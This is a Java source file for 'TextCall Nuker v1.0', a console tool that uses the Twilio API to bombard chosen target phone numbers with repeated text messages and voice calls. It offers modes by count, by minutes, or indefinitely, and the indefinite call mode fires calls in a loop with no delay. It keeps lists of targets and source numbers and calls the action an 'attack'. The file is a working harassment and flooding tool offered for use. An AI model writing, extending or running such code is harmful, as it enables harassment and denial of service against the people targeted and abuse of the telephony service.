import com.twilio.Twilio;
import com.twilio.example.TwiMLResponseExample;
import com.twilio.rest.api.v2010.account.Message;
import com.twilio.twiml.TwiMLException;
import com.twilio.twiml.VoiceResponse;
import com.twilio.twiml.voice.Hangup;
import com.twilio.twiml.voice.Say;
import com.twilio.type.PhoneNumber;
import com.twilio.rest.api.v2010.account.Call;
import com.twilio.type.Twiml;


import java.io.*;
import java.util.ArrayList;
import java.util.Scanner;


public class TextCallNukerV10 {
    private static String accountSID = "";
    private static String accountAuthToken = "";

    private static String twilioPhoneNumber = "";
    private static PhoneNumber sourceNumber;
    private static PhoneNumber targetNumber;
    private static String textMessage;
    private static int numberOfTexts;
    private static int numberOfCalls;
    private static ArrayList<String> availableSourceNumbersList = new ArrayList<String>();
    private static ArrayList<String> targetNumbersList = new ArrayList<String>();




    public static void main(String[] args) throws InterruptedException, IOException {
        Twilio.init(accountSID,accountAuthToken);
        while(true){
            Scanner scanner = new Scanner(System.in);
            System.out.println("******This app can only send SMS messages and calls to US numbers.******");
            System.out.println("Press x and enter to exit, otherwise press any other key and enter to continue");
            String input = scanner.nextLine();
            if(input.equals("x")){
                break;
            }else{
                System.out.println("TextCall Nuker v1.0 has loaded successfully.");
            }
            boolean loadSIDANDAUTHTOKENFromFile = false;
            while(true){
                System.out.println("Do you want to try and load SID and auth token from the account.txt file? (y/n)");
                input = scanner.nextLine();
                if(input.equals("y")){
                    try{
                        FileReader reader = new FileReader("account.txt");
                        BufferedReader bufferedReader = new BufferedReader(reader);
                        String inputFromReader = bufferedReader.readLine();
                        if(inputFromReader.length() == 34){
                            accountSID = inputFromReader;
                            System.out.println("The account SID " +accountSID + " has been read and initialized.");
                            inputFromReader = bufferedReader.readLine();
                            if(inputFromReader.length() == 32){
                                accountAuthToken = inputFromReader;
                                System.out.println("The account auth token " + accountAuthToken + " has been read and initialized.");
                                loadSIDANDAUTHTOKENFromFile = true;
                                break;
                            }else{
                                System.out.println("The account auth token that has been read is not 32 characters. Please try again.");
                            }
                        }else{
                            System.out.println("The account SID that have been read is not 34 characters. Please try again.");
                        }



                    } catch (FileNotFoundException e) {
                        System.out.println("Something went wrong when trying to locate the account.txt file.");
                    } catch (IOException e) {
                        System.out.println("Something went wrong when trying to read from the account.txt file.");
                    }
                }else if(input.equals("n")){
                    break;
                }else{
                    System.out.println("Invalid choice. Please try again.");
                }

            }

            while(true){
                if(loadSIDANDAUTHTOKENFromFile){
                    break;
                }
                BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter("account.txt"));
                while(true){
                    System.out.println("Please enter twilio account SID: ");
                    input = scanner.nextLine();
                    if(input.length() == 34){
                        accountSID = input;
                        try{
                            bufferedWriter.write(accountSID);
                            bufferedWriter.newLine();
                            System.out.println("account SID has been written to account.txt");
                        } catch (IOException e) {
                            System.out.println("Something went wrong when writing to the account.txt file.");
                            e.printStackTrace();
                        }
                        break;
                    }else{
                        System.out.println("Twilio account SID needs to be 34 characters long. Please try again.");
                    }
                }
                while(true){
                    System.out.println("Please enter twilo account auth token: ");
                    input = scanner.nextLine();
                    if(input.length() == 32){
                        accountAuthToken = input;
                        try{
                            bufferedWriter.write(accountAuthToken);
                            System.out.println("account auth token has been written to account.txt");
                            bufferedWriter.close();
                        } catch (IOException e) {
                            System.out.println("Something went wrong when writing to the account.txt file.");
                            e.printStackTrace();
                        }
                        break;
                    }else{
                        System.out.println("Twilio account auth token needs to be 32 characters long. Please try again.");
                    }
                }
                break;
            }
            System.out.println("Twilio account SID and auth token have been initialized. ");
            while(true){
                Scanner scannerTwo = new Scanner(System.in);
                System.out.println("Please choose an option:");
                System.out.println("1.Add source number");
                System.out.println("2.Add target number");
                System.out.println("3.Nuke texts");
                System.out.println("4.Nuke calls");
                System.out.println("5.View and add available source phone numbers");
                System.out.println("6.View source number in use");
                System.out.println("7.View and add target phone numbers");
                System.out.println("8.Exit");
                boolean hasInt = scannerTwo.hasNextInt();
                if(hasInt){
                    int numberInput = scannerTwo.nextInt();
                    scannerTwo.nextLine();
                    if(numberInput == 1){
                        addSourcePhoneNumber();

                    }else if(numberInput == 2){
                        addTargetPhoneNumber();

                    } else if(numberInput == 3){
                        if(!twilioPhoneNumber.equals("")){
                            nukeTextMenu();
                        }else{
                            System.out.println("You need to add a source number first.");
                        }
                    }else if(numberInput == 4){
                        if(!twilioPhoneNumber.equals("")){
                            nukeCallMenu();
                        }else{
                            System.out.println("You need to add a source number first.");
                        }
                    }else if(numberInput == 5){
                        availableSourcePhoneNumbersMenu();
                    }else if(numberInput == 6){
                        viewSourcePhoneNumberInUse();
                    }else if(numberInput == 7){
                        viewAndLoadTargetPhoneNumbers();
                    }else if(numberInput == 8){
                        break;
                    } else{
                        System.out.println("Invalid option. Please try again.");
                    }
                }else{
                    System.out.println("You did not enter a number. Please try again.");
                }

            }


        }


    }
    private static void addSourcePhoneNumber(){
        String sourcePhoneNumberTemp = "";
        while(true){
            Scanner scanner = new Scanner(System.in);
            System.out.println("Enter a 11 digit source phone number including country code (example: 17143425562): ");
            boolean hasLong = scanner.hasNextLong();
            if(hasLong){
                String input = String.valueOf(scanner.nextLong());
                scanner.nextLine();
                if(input.length() == 11){
                    sourcePhoneNumberTemp = input;
                    availableSourceNumbersList.add(input);
                    System.out.println("added " + input + " to the source numbers list");
                    while(true){
                        scanner = new Scanner(System.in);
                        System.out.println("Do you want to save this target number to sources.txt? (y/n)");
                        input = scanner.nextLine();
                        if(input.equals("y")){
                            File file = new File("sources.txt");
                            if(file.exists()){
                                try{
                                    BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(file, true));
                                    bufferedWriter.write(sourcePhoneNumberTemp);
                                    bufferedWriter.newLine();
                                    bufferedWriter.close();
                                    System.out.println("Successfully added " + sourcePhoneNumberTemp + " to sources.txt");
                                    break;
                                } catch (IOException e) {
                                    System.out.println("Something went wrong writing to sources.txt");
                                }
                            }else{
                                try{
                                    BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter("sources.txt"));
                                    bufferedWriter.write(sourcePhoneNumberTemp);
                                    bufferedWriter.newLine();
                                    bufferedWriter.close();
                                    System.out.println("Successfully added " + sourcePhoneNumberTemp + " to sources.txt");
                                    break;
                                } catch (IOException e) {
                                    System.out.println("Something went wrong writing to sources.txt");
                                }
                            }


                        }else if(input.equals("n")){
                            break;

                        }else{
                            System.out.println("Invalid choice. Please try again.");
                        }
                    }

                    break;
                }else{
                    System.out.println("The source phone number has to be 11 digits. Please try again.");
                }
            }else{
                System.out.println("You did not enter a valid number. Please try again");
            }

        }
    }
    private static void addTargetPhoneNumber(){
        String targetNumberTemp = "";
        while(true){
            Scanner scanner = new Scanner(System.in);
            System.out.println("Enter a 11 digit target phone number including country code (example: 17143425562): ");
            boolean hasLong = scanner.hasNextLong();
            if(hasLong){
                String input = String.valueOf(scanner.nextLong());
                scanner.nextLine();
                if(input.length() == 11){
                    targetNumbersList.add(input);
                    targetNumberTemp = input;
                    System.out.println("added " + input + " to the target numbers list");
                    while(true){
                        scanner = new Scanner(System.in);
                        System.out.println("Do you want to save this target number to targets.txt? (y/n)");
                        input = scanner.nextLine();
                        if(input.equals("y")){
                            File file = new File("targets.txt");
                            if(file.exists()){
                                try{
                                    BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(file, true));
                                    bufferedWriter.write(targetNumberTemp);
                                    bufferedWriter.newLine();
                                    System.out.println("Successfully added " + targetNumberTemp + " to targets.txt");
                                    bufferedWriter.close();
                                    break;
                                } catch (IOException e) {
                                    System.out.println("Something went wrong writing to targets.txt");
                                }
                            }else{
                                try{
                                    BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter("targets.txt"));
                                    bufferedWriter.write(targetNumberTemp);
                                    bufferedWriter.newLine();
                                    bufferedWriter.close();
                                    System.out.println("Successfully added " + targetNumberTemp + " to targets.txt");
                                    break;
                                } catch (IOException e) {
                                    System.out.println("Something went wrong writing to targets.txt");
                                }
                            }


                        }else if(input.equals("n")){
                            break;

                        }else{
                            System.out.println("Invalid choice. Please try again.");
                        }
                    }
                    break;
                }else{
                    System.out.println("The source phone number has to be 11 digits. Please try again.");
                }
            }else{
                System.out.println("You did not enter a valid number. Please try again");
            }

        }

    }
    private static void viewAndLoadTargetPhoneNumbers(){
        Scanner scanner = new Scanner(System.in);
        while(true){
            System.out.println("Here are the target phone numbers in the list: ");
            for(int i=0; i<targetNumbersList.size(); i++){
                System.out.println((i+1) + "." + targetNumbersList.get(i));
            }
            System.out.println(targetNumbersList.size()+1 + "." + "Add all target numbers from targets.txt");
            System.out.println(targetNumbersList.size()+2 + "." + "Exit");
            boolean hasInt = scanner.hasNextInt();
            if(hasInt){
                int choice = scanner.nextInt();
                scanner.nextLine();
                if(choice == targetNumbersList.size()+1){
                    File file = new File("targets.txt");
                    if(file.exists()){
                        try{
                            BufferedReader reader = new BufferedReader(new FileReader(file));
                            while(reader.ready()){
                                String number = reader.readLine();
                                if(!targetNumbersList.contains(number)){
                                    targetNumbersList.add(number);
                                    System.out.println("added " + number + " to the target number list");
                                }

                            }
                            System.out.println("All numbers have been added from targets.txt");

                        } catch (FileNotFoundException e) {
                            System.out.println("Something went wrong when locating targets.txt");
                        } catch (IOException e) {
                            System.out.println("Something went wrong when trying to read from targets.txt");
                        }
                    }else{
                        System.out.println("The file targets.txt does not exist. Please create one.");

                    }

                }else if(choice == targetNumbersList.size()+2){
                    break;
                }else{
                    System.out.println("That choice does not exist. Please try again.");
                }
            }else{
                System.out.println("Invalid choice. Please try again.");
            }
        }
    }
    private static boolean getInputForTexts(){
        Scanner scanner = new Scanner(System.in);
        boolean exit = false;
        boolean exitTwo = false;
        while(true){
            System.out.println("Enter a target phone number including the country code. Example: 17143305401");
            System.out.println("Press x and then enter to load phone number from targets number list");
            System.out.println("Press y and then enter to exit to the main menu");
            boolean hasNumber = scanner.hasNextLong();
            if(hasNumber){
                String phoneNumber = scanner.nextLine();
                if(phoneNumber.length() == 11){
                    targetNumber = new PhoneNumber(phoneNumber);
                    System.out.println("Target number has been entered.");
                    break;
                }else{
                    System.out.println("You did not enter the right amount of digits. The number needs to be 11 digits total.");
                }
            }else{
                while(true){
                    if(exit){
                        break;
                    }
                    String input = scanner.nextLine();
                    if(input.equals("x")){
                        System.out.println("Available target numbers: ");
                        for(int i=0; i<targetNumbersList.size(); i++){
                            System.out.println((i+1) + "." + targetNumbersList.get(i));
                        }
                        System.out.println(targetNumbersList.size()+1 + ".Exit");
                        boolean hasInt = scanner.hasNextInt();
                        if(hasInt){
                            int choice = scanner.nextInt();
                            scanner.nextLine();
                            if(choice <= targetNumbersList.size()){
                                targetNumber = new PhoneNumber(targetNumbersList.get(choice-1));
                                exit = true;
                                break;
                            }else{
                                if(choice == targetNumbersList.size()+1){
                                    break;
                                }else{
                                    System.out.println("That choice does not exist. Please try again.");
                                }

                            }
                        }else{
                            System.out.println("Invalid choice. Please try again.");

                        }
                    }else if(input.equals("y")){
                        exit = true;
                        exitTwo = true;
                        break;
                    } else{
                        System.out.println("You did not enter a valid number. Please try again.");
                        break;
                    }

                }
                if(exit){
                    break;
                }
            }

        }
        if(!exitTwo){
            System.out.println("Write your text message: ");
            textMessage = scanner.nextLine();
            System.out.println("Text message has been entered.");
            while(true){
                System.out.println("Enter the number of texts you want to send: ");
                boolean hasInt = scanner.hasNextInt();
                if(hasInt){
                    numberOfTexts = scanner.nextInt();
                    scanner.nextLine();
                    System.out.println("Number of texts has been entered.");
                    return true;
                }else{
                    System.out.println("You did not enter a number. Please try again.");
                }
            }
        }
        return false;

    }
    private static boolean getInputForTextsIndefinitely(){
        Scanner scanner = new Scanner(System.in);
        boolean exit = false;
        boolean exitTwo = false;
        while(true){
            System.out.println("Enter a target phone number including the country code. Example: 17143305401");
            System.out.println("Press x and then enter to load phone number from targets number list");
            System.out.println("Press y and then enter to exit to the main menu");
            boolean hasNumber = scanner.hasNextLong();
            if(hasNumber){
                String phoneNumber = scanner.nextLine();
                if(phoneNumber.length() == 11){
                    targetNumber = new PhoneNumber(phoneNumber);
                    System.out.println("Target number has been entered.");
                    break;
                }else{
                    System.out.println("You did not enter the right amount of digits. The number needs to be 11 digits total.");
                }
            }else{
                while(true){
                    String input = scanner.nextLine();
                    if(input.equals("x")){
                        System.out.println("Available target numbers: ");
                        for(int i=0; i<targetNumbersList.size(); i++){
                            System.out.println((i+1) + "." + targetNumbersList.get(i));
                        }
                        System.out.println(targetNumbersList.size()+1 + ".Exit");
                        boolean hasInt = scanner.hasNextInt();
                        if(hasInt){
                            int choice = scanner.nextInt();
                            scanner.nextLine();
                            if(choice <= targetNumbersList.size()){
                                targetNumber = new PhoneNumber(targetNumbersList.get(choice-1));
                                exit = true;
                                break;
                            }else{
                                if(choice == targetNumbersList.size()+1){
                                    break;
                                }else{
                                    System.out.println("That choice does not exist. Please try again.");
                                }

                            }
                        }else{
                            System.out.println("Invalid choice. Please try again.");

                        }
                    }else if(input.equals("y")){
                        exit = true;
                        exitTwo = true;
                        break;
                    } else{
                        System.out.println("You did not enter a valid number. Please try again.");
                        break;
                    }

                }
                if(exit){
                    break;
                }
            }
        }
        if(!exitTwo){
            System.out.println("Write your text message: ");
            textMessage = scanner.nextLine();
            System.out.println("Text message has been entered.");
            return true;
        }
        return false;
    }
    private static long getInputForTextsMinutes() {
        Scanner scanner = new Scanner(System.in);
        boolean exit = false;
        boolean exitTwo = false;
        while (true) {
            System.out.println("Enter a target phone number including the country code. Example: 17143305401");
            System.out.println("Press x and then enter to load phone number from targets number list");
            System.out.println("Press y and then enter to exit to the main menu");
            boolean hasNumber = scanner.hasNextLong();
            if (hasNumber) {
                String phoneNumber = scanner.nextLine();
                if (phoneNumber.length() == 11) {
                    targetNumber = new PhoneNumber(phoneNumber);
                    System.out.println("Target number has been entered.");
                    break;
                } else {
                    System.out.println("You did not enter the right amount of digits. The number needs to be 11 digits total.");
                }
            } else {
                while (true) {
                    String input = scanner.nextLine();
                    if (input.equals("x")) {
                        System.out.println("Available target numbers: ");
                        for (int i = 0; i < targetNumbersList.size(); i++) {
                            System.out.println((i + 1) + "." + targetNumbersList.get(i));
                        }
                        System.out.println(targetNumbersList.size() + 1 + ".Exit");
                        boolean hasInt = scanner.hasNextInt();
                        if (hasInt) {
                            int choice = scanner.nextInt();
                            scanner.nextLine();
                            if (choice <= targetNumbersList.size()) {
                                targetNumber = new PhoneNumber(targetNumbersList.get(choice - 1));
                                exit = true;
                                break;
                            } else {
                                if (choice == targetNumbersList.size() + 1) {
                                    break;
                                } else {
                                    System.out.println("That choice does not exist. Please try again.");
                                }

                            }
                        } else {
                            System.out.println("Invalid choice. Please try again.");

                        }
                    } else if (input.equals("y")) {
                        exit = true;
                        exitTwo = true;
                        break;
                    } else {
                        System.out.println("You did not enter a valid number. Please try again.");
                        break;
                    }

                }
                if(exit){
                    break;
                }
            }

        }
        if(!exitTwo){
            System.out.println("Write your text message: ");
            textMessage = scanner.nextLine();
            System.out.println("Text message has been entered.");
            while (true) {
                System.out.println("Enter the number of minutes you want to keep sending: ");
                boolean hasLong = scanner.hasNextLong();
                if (hasLong) {
                    long minutesDuration = scanner.nextLong();
                    scanner.nextLine();
                    System.out.println("Minutes has been entered.");
                    return minutesDuration;
                } else {
                    System.out.println("You did not enter a number. Please try again.");
                }

            }
        }else{
            return -1;
        }

    }
    private static boolean getInputForCalls(){
        Scanner scanner = new Scanner(System.in);
        boolean exit = false;
        boolean exitTwo = false;
        while(true){
            System.out.println("Enter a target phone number including the country code. Example: 17143305401");
            System.out.println("Press x and then enter to load phone number from targets number list");
            System.out.println("Press y and then enter to exit to the main menu");
            boolean hasNumber = scanner.hasNextLong();
            if(hasNumber){
                String phoneNumber = scanner.nextLine();
                if(phoneNumber.length() == 11){
                    targetNumber = new PhoneNumber(phoneNumber);
                    System.out.println("Target number has been entered.");
                    break;
                }else{
                    System.out.println("You did not enter the right amount of digits. The number needs to be 11 digits total.");
                }
            }else{
                while(true){
                    String input = scanner.nextLine();
                    if(input.equals("x")){
                        System.out.println("Available target numbers: ");
                        for(int i=0; i<targetNumbersList.size(); i++){
                            System.out.println((i+1) + "." + targetNumbersList.get(i));
                        }
                        System.out.println(targetNumbersList.size()+1 + ".Exit");
                        boolean hasInt = scanner.hasNextInt();
                        if(hasInt){
                            int choice = scanner.nextInt();
                            scanner.nextLine();
                            if(choice <= targetNumbersList.size()){
                                targetNumber = new PhoneNumber(targetNumbersList.get(choice-1));
                                exit = true;
                                break;
                            }else{
                                if(choice == targetNumbersList.size()+1){
                                    break;
                                }else{
                                    System.out.println("That choice does not exist. Please try again.");
                                }

                            }
                        }else{
                            System.out.println("Invalid choice. Please try again.");

                        }
                    }else if(input.equals("y")){
                        exit = true;
                        exitTwo = true;
                        break;
                    }else{
                        System.out.println("You did not enter a valid number. Please try again.");
                        break;
                    }

                }
                if(exit){
                    break;
                }
            }

        }
        if(!exitTwo){
            while(true){
                System.out.println("Enter the number of calls you want to send: ");
                boolean hasInt = scanner.hasNextInt();
                if(hasInt){
                    numberOfCalls= scanner.nextInt();
                    scanner.nextLine();
                    System.out.println("Number of calls has been entered.");
                    return true;
                }else{
                    System.out.println("You did not enter a number. Please try again.");
                }
            }
        }
        return false;

    }
    private static boolean getInputForCallsIndefinitely(){
        Scanner scanner = new Scanner(System.in);
        boolean exit = false;
        boolean result = false;
        while(true){
            System.out.println("Enter a target phone number including the country code. Example: 17143305401");
            System.out.println("Press x and then enter to load phone number from targets number list");
            System.out.println("Press y and then enter to exit to the main menu");
            boolean hasNumber = scanner.hasNextLong();
            if(hasNumber){
                String phoneNumber = scanner.nextLine();
                if(phoneNumber.length() == 11){
                    targetNumber = new PhoneNumber(phoneNumber);
                    System.out.println("Target number has been entered.");
                    break;
                }else{
                    System.out.println("You did not enter the right amount of digits. The number needs to be 11 digits total.");
                }
            }else{
                while(true){
                    String input = scanner.nextLine();
                    if(input.equals("x")){
                        System.out.println("Available target numbers: ");
                        for(int i=0; i<targetNumbersList.size(); i++){
                            System.out.println((i+1) + "." + targetNumbersList.get(i));
                        }
                        System.out.println(targetNumbersList.size()+1 + ".Exit");
                        boolean hasInt = scanner.hasNextInt();
                        if(hasInt){
                            int choice = scanner.nextInt();
                            scanner.nextLine();
                            if(choice <= targetNumbersList.size()){
                                targetNumber = new PhoneNumber(targetNumbersList.get(choice-1));
                                exit = true;
                                result = true;
                                break;
                            }else{
                                if(choice == targetNumbersList.size()+1){
                                    break;
                                }else{
                                    System.out.println("That choice does not exist. Please try again.");
                                }

                            }
                        }else{
                            System.out.println("Invalid choice. Please try again.");

                        }
                    }else if(input.equals("y")){
                        exit = true;
                        break;
                    } else{
                        System.out.println("You did not enter a valid number. Please try again.");
                        break;
                    }

                }
                if(exit){
                    break;
                }
            }
        }
        return result;

    }
    private static long getInputForCallsMinutes(){
        Scanner scanner = new Scanner(System.in);
        boolean exit = false;
        boolean exitTwo = false;
        while(true){
            System.out.println("Enter a target phone number including the country code. Example: 17143305401");
            System.out.println("Press x and then enter to load phone number from targets number list");
            System.out.println("Press y to exit to the main menu");
            boolean hasNumber = scanner.hasNextLong();
            if(hasNumber){
                String phoneNumber = scanner.nextLine();
                if(phoneNumber.length() == 11){
                    targetNumber = new PhoneNumber(phoneNumber);
                    System.out.println("Target number has been entered.");
                    break;
                }else{
                    System.out.println("You did not enter the right amount of digits. The number needs to be 11 digits total.");
                }
            }else{
                while(true){
                    String input = scanner.nextLine();
                    if(input.equals("x")){
                        System.out.println("Available target numbers: ");
                        for(int i=0; i<targetNumbersList.size(); i++){
                            System.out.println((i+1) + "." + targetNumbersList.get(i));
                        }
                        System.out.println(targetNumbersList.size()+1 + ".Exit");
                        boolean hasInt = scanner.hasNextInt();
                        if(hasInt){
                            int choice = scanner.nextInt();
                            scanner.nextLine();
                            if(choice <= targetNumbersList.size()){
                                targetNumber = new PhoneNumber(targetNumbersList.get(choice-1));
                                exit = true;
                                break;
                            }else{
                                if(choice == targetNumbersList.size()+1){
                                    break;
                                }else{
                                    System.out.println("That choice does not exist. Please try again.");
                                }

                            }
                        }else{
                            System.out.println("Invalid choice. Please try again.");

                        }
                    }else if(input.equals("y")){
                        exit = true;
                        exitTwo = true;
                        break;
                    } else{
                        System.out.println("You did not enter a valid number. Please try again.");
                        break;
                    }

                }
                if(exit){
                    break;
                }
            }

        }
        if(!exitTwo){
            while(true){
                System.out.println("Enter the number of minutes you want to keep sending: ");
                boolean hasLong = scanner.hasNextLong();
                if(hasLong){
                    long minutes = scanner.nextLong();
                    scanner.nextLine();
                    System.out.println("Minutes has been entered.");
                    return minutes;
                }else{
                    System.out.println("You did not enter a number. Please try again.");
                }
            }
        }else{
            return -1;
        }

    }
    private static void sendSMS(PhoneNumber targetNumber, PhoneNumber sourceNumber, String textMessage, int numberOfTexts){
        for(int i=0; i<numberOfTexts; i++){
            Message message = Message.creator(targetNumber, sourceNumber, textMessage).create();
            System.out.println("Sent SMS: " +textMessage);
        }
        System.out.println("Finished nuking.");
    }
    private static void sendSMS(PhoneNumber targetNumber, PhoneNumber sourceNumber, String textMessage) throws InterruptedException {
        while(true){
            Thread.sleep(50);
            Message message = Message.creator(targetNumber, sourceNumber, textMessage).create();
            System.out.println("Sent SMS: " +textMessage);
        }
    }
    private static void sendSMS(PhoneNumber targetNumber, PhoneNumber sourceNumber, String textMessage, long minutes) throws InterruptedException {
        int count = 0;
        long minutesToSeconds = minutes * 60;
        while(true){
            Message message = Message.creator(targetNumber, sourceNumber, textMessage).create();
            System.out.println("Sent SMS: " +textMessage);
            count++;
            Thread.sleep(1000);
            if(count == minutesToSeconds){
                break;
            }
        }
        System.out.println("Finished nuking.");
    }

    private static void sendCall(PhoneNumber targetNumber, PhoneNumber sourceNumber, int numberOfCalls){
        Twiml response = new Twiml("<Response><Say>Hello</Say></Response>");
        System.out.println("Currently nuking....");
        for(int i=0; i<numberOfCalls; i++){
            Call call = Call.creator(targetNumber, sourceNumber,response).create();
        }
        System.out.println("Finished nuking.");
    }
    private static void sendCall(PhoneNumber targetNumber, PhoneNumber sourceNumber) throws InterruptedException {
        Twiml response = new Twiml("<Response><Say>Hello</Say></Response>");
        System.out.println("Currently nuking....");
        while(true){
            Call call = Call.creator(targetNumber, sourceNumber, response).create();

        }
    }
    private static void sendCall(PhoneNumber targetNumber, PhoneNumber sourceNumber, long minutes) throws InterruptedException {
        Twiml response = new Twiml("<Response><Say>Hello</Say></Response>");
        long minutesToSeconds = minutes * 60;
        int count = 0;
        System.out.println("Currently nuking....");
        while(true){
            Call call = Call.creator(targetNumber, sourceNumber, response).create();
            count++;
            Thread.sleep(1000);
            if(count == minutesToSeconds){
                break;
            }
        }
        System.out.println("Finished nuking.");

    }
    private static void nukeTextMenu() throws InterruptedException {
        Scanner scanner = new Scanner(System.in);
        while(true){
            System.out.println("Please choose an option: ");
            System.out.println("1. Nuke texts by number of texts");
            System.out.println("2. Nuke texts indefinitely");
            System.out.println("3. Nuke texts by minutes");
            boolean hasInt = scanner.hasNextInt();
            if(hasInt){
                int input = scanner.nextInt();
                scanner.nextLine();
                if(input == 1){
                    if(getInputForTexts()){
                        System.out.println("All the necessary information has been entered. Ready to nuke in 5 seconds....");
                        for(int i=1; i<=5; i++){
                            System.out.println(i);
                            Thread.sleep(1000);
                        }
                        sendSMS(targetNumber, sourceNumber, textMessage, numberOfTexts);
                        break;
                    }else{
                        break;
                    }


                }else if(input == 2){
                    if(getInputForTextsIndefinitely()){
                        System.out.println("All the necessary information has been entered. Ready to nuke in 5 seconds....");
                        for(int i=1; i<=5; i++){
                            System.out.println(i);
                            Thread.sleep(1000);
                        }
                        sendSMS(targetNumber, sourceNumber, textMessage);
                        break;
                    }else{
                        break;
                    }
                }else if(input == 3){
                    long minutes = getInputForTextsMinutes();
                    if(minutes != -1){
                        System.out.println("All the necessary information has been entered. Ready to nuke in 5 seconds....");
                        for(int i=1; i<=5; i++){
                            System.out.println(i);
                            Thread.sleep(1000);
                        }
                        sendSMS(targetNumber, sourceNumber, textMessage,minutes);
                        break;
                    }else{
                        break;
                    }


                }else{
                    System.out.println("Invalid option. Please try again.");
                }
            }else{
                System.out.println("You did not enter a valid number. Please try again.");
            }
        }
    }
    private static void nukeCallMenu() throws InterruptedException {
        Scanner scanner = new Scanner(System.in);
        while(true){
            System.out.println("Please choose an option: ");
            System.out.println("1.Nuke calls by number of calls");
            System.out.println("2.Nuke calls indefinitely");
            System.out.println("3.Nuke calls by minutes");
            boolean hasInt = scanner.hasNextInt();
            if(hasInt){
                int input = scanner.nextInt();
                scanner.nextLine();
                if(input == 1){
                    if(getInputForCalls()){
                        System.out.println("All the necessary information has been entered. Ready to nuke in 5 seconds....");
                        for(int i=1; i<=5; i++){
                            System.out.println(i);
                            Thread.sleep(1000);
                        }
                        sendCall(targetNumber, sourceNumber, numberOfCalls);
                        break;
                    }else{
                        break;
                    }

                }else if(input == 2){
                    if(getInputForCallsIndefinitely()){
                        System.out.println("All the necessary information has been entered. Ready to nuke in 5 seconds....");
                        for(int i=1; i<=5; i++){
                            System.out.println(i);
                            Thread.sleep(1000);
                        }
                        sendCall(targetNumber, sourceNumber);
                        break;
                    }else{
                        break;
                    }
                }else if(input == 3){
                    long minutes = getInputForCallsMinutes();
                    if(minutes != -1){
                        System.out.println("All the necessary information has been entered. Ready to nuke in 5 seconds....");
                        for(int i=1; i<=5; i++){
                            System.out.println(i);
                            Thread.sleep(1000);
                        }
                        sendCall(targetNumber, sourceNumber, minutes);
                        break;
                    }else{
                        break;
                    }


                }else{
                    System.out.println("Invalid option. Please try again.");
                }
            }else{
                System.out.println("You did not enter a valid number. Please try again.");

            }
        }
    }
    private static void availableSourcePhoneNumbersMenu(){
        Scanner scanner = new Scanner(System.in);
        while(true){
            System.out.println("Here are the available source phone numbers you can use for your attack. Choose one: ");
            for(int i=0; i<availableSourceNumbersList.size(); i++) {
                System.out.println(i + 1 + "." + availableSourceNumbersList.get(i));
            }
            System.out.println(availableSourceNumbersList.size() + 1 + "." + "Add source phone numbers from sources.txt");
            System.out.println(availableSourceNumbersList.size() + 2  + "." + "Exit");
            boolean hasInt = scanner.hasNextInt();
            if(hasInt){
                int input = scanner.nextInt();
                scanner.nextLine();
                if(input == availableSourceNumbersList.size()+1){
                    File file = new File("sources.txt");
                    if(file.exists()){
                        try{
                            BufferedReader reader = new BufferedReader(new FileReader(file));
                            while(reader.ready()){
                                String number = reader.readLine();
                                if(!availableSourceNumbersList.contains(number)){
                                    availableSourceNumbersList.add(number);
                                    System.out.println("Successfully added " + number + " to the sources phone number list");
                                }
                            }
                            System.out.println("All source phone numbers has been added from sources.txt");
                        } catch (IOException e) {
                            System.out.println("Something went wrong when reading from sources.txt ");
                        }
                    }else{
                        System.out.println("The sources.txt file does not exist. Please create one.");

                    }
                }else if(input == availableSourceNumbersList.size()+2){
                    break;
                }else{
                    input--;
                    if(availableSourceNumbersList.get(input) == null){
                        System.out.println("That option does not exist. Please try again.");
                    }else{
                        if(!twilioPhoneNumber.equals(availableSourceNumbersList.get(input))){
                            twilioPhoneNumber = availableSourceNumbersList.get(input);
                            sourceNumber = new PhoneNumber(twilioPhoneNumber);
                            System.out.println(availableSourceNumbersList.get(input) + " has been added as the source number.");
                        }else{
                            System.out.println(availableSourceNumbersList.get(input) + " is already added as the source number.");
                        }
                    }
                }


            }else{
                System.out.println("Please enter a valid option.");
                scanner.nextLine();
            }
        }
    }

    private static void viewSourcePhoneNumberInUse(){
        Scanner scanner = new Scanner(System.in);
        while(true){
            System.out.println("Current source number in use: " + twilioPhoneNumber);
            System.out.println("1.Exit");
            boolean hasInt = scanner.hasNextInt();
            if(hasInt){
                int input = scanner.nextInt();
                scanner.nextLine();
                if(input == 1){
                    break;
                }else{
                    System.out.println("Invalid option. Please try again.");
                }
            }else{
                System.out.println("That option is not valid. Please try again.");
            }
        }
    }






}
